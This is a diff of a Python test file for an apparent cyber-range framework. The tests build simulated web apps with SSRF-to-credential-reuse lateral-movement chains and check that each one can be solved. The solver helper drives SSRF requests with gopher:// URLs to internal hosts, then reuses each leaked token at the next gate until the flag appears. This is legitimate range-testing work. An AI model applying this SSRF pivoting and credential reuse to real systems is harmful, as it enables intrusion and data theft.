@@ -1,7 +1,9 @@
 """Credential-reuse lateral movement (DESIGN.md §11): the SSRF becomes an agent-driven
-internal proxy; an internal service leaks a db credential the agent reuses to open the
-internal db that gates the flag. The flag is reachable ONLY via that gate. A PROCESS
-solve here; the docker-gated test proves the same chain across real containers."""
+internal proxy, and the chain is SYNTHESIZED at a sampled depth from one composable
+primitive — an entry host leaks a credential, each gated host relays the next, the last
+serves the flag. One preset synthesizes 1-, 2-, 3-hop chains. The flag is reachable ONLY
+through the final gate. PROCESS solves here; the docker-gated test proves it on real
+containers."""
 
 from __future__ import annotations
 
@@ -20,19 +22,29 @@ from openrange_pack_sdk import Backing, Snapshot
 from openrange.core.admit import admit
 from openrange.core.episode import EpisodeService
 
-_LATERAL_MANIFEST = {
-    "pack": {"id": "webapp"},
-    "runtime": {"tick": {"mode": "off"}},
-    "npc": [],
-    "seed": 3,
-    "lateral_movement": True,
-}
+
+def _manifest(seed: int = 3) -> dict:
+    return {
+        "pack": {"id": "webapp"},
+        "runtime": {"tick": {"mode": "off"}},
+        "npc": [],
+        "seed": seed,
+        "lateral_movement": True,
+    }
 
 
-def _admit() -> Snapshot:
-    snap = admit(WebappPack(), manifest=_LATERAL_MANIFEST, max_repairs=3)
+def _admit(seed: int = 3) -> Snapshot:
+    snap = admit(WebappPack(), manifest=_manifest(seed), max_repairs=3)
     assert isinstance(snap, Snapshot), snap
     return snap
+
+
+def _chain_depth(graph: WorldGraph) -> int:
+    return sum(
+        1
+        for n in graph.by_kind("vulnerability")
+        if n.attrs.get("kind") in ("credential_gated_relay", "credential_gated_flag")
+    )
 
 
 def _ssrf_entry(graph: WorldGraph) -> tuple[str, str]:
@@ -52,7 +64,7 @@ def _ssrf_entry(graph: WorldGraph) -> tuple[str, str]:
     )
 
 
-def _metadata_host(graph: WorldGraph) -> str:
+def _entry_host(graph: WorldGraph) -> str:
     leak_ep = next(n for n in graph.by_kind("endpoint") if n.id.endswith("_credleak"))
     svc = next(
         e.src
@@ -62,56 +74,73 @@ def _metadata_host(graph: WorldGraph) -> str:
     return str(graph.nodes[svc].attrs["name"])
 
 
-def _get(base: str, path: str, query: dict[str, str] | None = None) -> tuple[int, str]:
+def _get(base: str, path: str, query: dict[str, str] | None = None) -> str:
     url = f"{base}{path}"
     if query:
         url += "?" + urllib.parse.urlencode(query)
     try:
         with urllib.request.urlopen(url, timeout=15) as resp:
-            return resp.status, resp.read().decode()
+            return resp.read().decode()
     except urllib.error.HTTPError as exc:
-        return exc.code, exc.read().decode()
+        return exc.read().decode()
 
 
-def _solve(
-    base: str, ssrf_url: str, param: str, meta_host: str
-) -> tuple[str, str, str]:
-    # Drive the chain the way an agent would; returns (leaked config body, gate-without-
-    # credential body, gate-with-credential body).
-    _, cfg_body = _get(
-        base, ssrf_url, {param: f"gopher://{meta_host}/internal/credentials"}
-    )
-    cfg = json.loads(cfg_body)
-    host, vpath, aparam, token = (
-        cfg["vault_host"],
-        cfg["vault_path"],
-        cfg["auth_param"],
-        cfg["db_token"],
-    )
-    _, no_cred = _get(base, ssrf_url, {param: f"gopher://{host}{vpath}"})
-    _, with_cred = _get(
-        base, ssrf_url, {param: f"gopher://{host}{vpath}?{aparam}={token}"}
-    )
-    return cfg_body, no_cred, with_cred
+def _follow_chain(base: str, ssrf_url: str, param: str, entry: str) -> dict:
+    # Drive the chain the way an agent would: SSRF to the entry host, then keep reusing
+    # each handed-over credential at the next host until one returns the flag. Records
+    # the entry body, the terminal body, and a no-credential probe at every gated hop.
+    entry_body = _get(base, ssrf_url, {param: f"gopher://{entry}/internal/credentials"})
+    cfg = json.loads(entry_body)
+    no_cred_bodies: list[str] = []
+    terminal_body = entry_body
+    while "vault_host" in cfg:
+        host, vpath = cfg["vault_host"], cfg["vault_path"]
+        aparam, token = cfg["auth_param"], cfg["db_token"]
+        no_cred_bodies.append(_get(base, ssrf_url, {param: f"gopher://{host}{vpath}"}))
+        terminal_body = _get(
+            base, ssrf_url, {param: f"gopher://{host}{vpath}?{aparam}={token}"}
+        )
+        try:
+            cfg = json.loads(terminal_body)
+        except json.JSONDecodeError:
+            cfg = {}
+    return {
+        "entry": entry_body,
+        "terminal": terminal_body,
+        "no_cred": no_cred_bodies,
+    }
 
 
-def test_lateral_world_wires_the_credential_chain() -> None:
+def _enables_chain_kinds(graph: WorldGraph) -> list[str]:
+    # Walk the single enables path from the ssrf and return the kinds in order.
+    by_id = {n.id: n for n in graph.by_kind("vulnerability")}
+    out = {e.src: e.dst for e in graph.edges.values() if e.kind == "enables"}
+    node = next(v.id for v in by_id.values() if v.attrs.get("kind") == "ssrf")
+    kinds: list[str] = []
+    seen: set[str] = set()
+    while node is not None and node not in seen:
+        seen.add(node)
+        kinds.append(str(by_id[node].attrs.get("kind")))
+        node = out.get(node)
+    return kinds
+
+
+def test_lateral_chain_is_synthesized_and_wired() -> None:
     graph = _admit().graph
-    kinds = {n.attrs.get("kind") for n in graph.by_kind("vulnerability")}
-    assert {"ssrf", "credential_leak", "credential_gated_flag"} <= kinds
     assert _is_networked(graph)
-
-    # The SSRF is in proxy mode (agent-driven), not the single fixed pivot.
     ssrf = next(
         n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
     )
-    assert "internal_hosts" in ssrf.attrs["params"]
+    assert "internal_hosts" in ssrf.attrs["params"]  # proxy mode, agent-driven
 
-    # The chain is wired: ssrf -> credential_leak -> credential_gated_flag.
-    by_kind = {n.attrs.get("kind"): n.id for n in graph.by_kind("vulnerability")}
-    enables = {(e.src, e.dst) for e in graph.edges.values() if e.kind == "enables"}
-    assert (by_kind["ssrf"], by_kind["credential_leak"]) in enables
-    assert (by_kind["credential_leak"], by_kind["credential_gated_flag"]) in enables
+    # The enables path is ssrf -> credential_leak -> (relay ->)* -> gated_flag at the
+    # sampled depth — exactly one leak entry and one terminal flag gate.
+    kinds = _enables_chain_kinds(graph)
+    assert kinds[0] == "ssrf"
+    assert kinds[1] == "credential_leak"
+    assert kinds[-1] == "credential_gated_flag"
+    assert all(k == "credential_gated_relay" for k in kinds[2:-1])
+    assert _chain_depth(graph) == len(kinds) - 2  # relays + the terminal gate
 
     # The flag record's value is a decoy — the real flag only lives in the gated secret.
     flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
@@ -123,25 +152,33 @@ def test_lateral_world_wires_the_credential_chain() -> None:
     assert record.attrs["fields"]["value"] != flag
 
 
+def test_lateral_synthesizes_varied_depth() -> None:
+    # One preset, many depths: the engine synthesizes a distribution, not a fixed shape.
+    depths = {_chain_depth(_admit(seed).graph) for seed in range(12)}
+    assert len(depths) >= 2
+    assert depths <= {1, 2, 3}
+
+
 def test_lateral_solves_on_process(tmp_path) -> None:
     snap = _admit()
     graph = snap.graph
     flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
     ssrf_url, param = _ssrf_entry(graph)
-    meta_host = _metadata_host(graph)
+    entry = _entry_host(graph)
 
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
     svc = EpisodeService(WebappPack(), tmp_path)
     try:
         handle = svc.start_episode(snap, pentest.id)
         base = str(svc.surface(handle)["base_url"])
-        cfg, no_cred, with_cred = _solve(base, ssrf_url, param, meta_host)
-        assert flag not in cfg  # the metadata leaks the credential, never the flag
-        assert flag not in no_cred  # the gate denies without the reused credential
-        assert flag in with_cred  # reusing the leaked credential opens the vault
-        # The db's own default endpoint cannot leak it either — only the gate can.
-        _, db_default = _get(base, ssrf_url, {param: f"gopher://{meta_host}/records"})
-        assert flag not in db_default
+        out = _follow_chain(base, ssrf_url, param, entry)
+        assert flag not in out["entry"]  # the entry leaks a credential, never the flag
+        assert all(
+            flag not in b for b in out["no_cred"]
+        )  # every gate denies w/o the key
+        assert (
+            flag in out["terminal"]
+        )  # reusing the chain of credentials opens the vault
     finally:
         svc.close()
 
@@ -164,24 +201,25 @@ def _docker_available() -> bool:
 
 @pytest.mark.skipif(not _docker_available(), reason="docker engine not reachable")
 def test_lateral_solves_across_real_containers() -> None:
-    # The real sim-to-real target: credential reuse across real per-service containers.
-    # Each hop is a real fetch over the docker network; the flag lives in an internal
-    # container reachable only by pivoting, and only with the credential moved over.
+    # The real sim-to-real target: the credential chain reused across real per-service
+    # containers, each hop a real fetch over the docker network.
     snap = _admit()
     graph = snap.graph
     flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
     ssrf_url, param = _ssrf_entry(graph)
-    meta_host = _metadata_host(graph)
+    entry = _entry_host(graph)
 
     runtime = WebappPack().realize(graph, Backing.CONTAINER)
     assert isinstance(runtime, NetworkedContainerWebappRuntime)
     try:
         runtime.reset()
         base = str(runtime.surface()["base_url"])
-        cfg, no_cred, with_cred = _solve(base, ssrf_url, param, meta_host)
-        assert flag not in cfg
-        assert flag not in no_cred
-        assert flag in with_cred  # recovered across containers via credential reuse
+        out = _follow_chain(base, ssrf_url, param, entry)
+        assert flag not in out["entry"]
+        assert all(flag not in b for b in out["no_cred"])
+        assert (
+            flag in out["terminal"]
+        )  # recovered across containers via credential reuse
         assert "secret_flag" in runtime.collect()["leaked_secret_ids"]
     finally:
         runtime.stop()
